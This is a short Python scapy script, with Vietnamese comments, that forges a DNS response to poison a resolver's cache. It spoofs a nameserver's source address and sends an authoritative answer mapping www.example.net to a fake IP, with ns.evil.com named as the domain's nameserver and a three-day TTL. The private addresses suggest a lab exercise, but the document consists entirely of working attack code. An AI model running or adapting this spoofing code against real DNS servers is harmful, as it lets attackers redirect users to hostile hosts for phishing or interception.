from scapy.all import *
# Thông tin giả mạo
target_ip = "192.168.108.139"  # IP của DNS server
fake_ns_ip = "192.168.108.200"  # IP của nameserver giả mạo
spoofed_ip = "1.2.3.4"  # IP giả mạo của www.example.net

# Thông tin DNS giả mạo
name = "www.example.net"  # Tên miền mục tiêu
domain = "example.net"
ns = "ns.evil.com"  # Nameserver giả mạo

Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type="A", rdata=spoofed_ip, ttl=259200)
NSsec = DNSRR(rrname=domain, type="NS", rdata=ns, ttl=259200)

dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst=target_ip, src=fake_ns_ip)
udp = UDP(dport=53, sport=12345, chksum=0)
reply = ip/udp/dns

# Gửi reply giả mạo
send(reply)
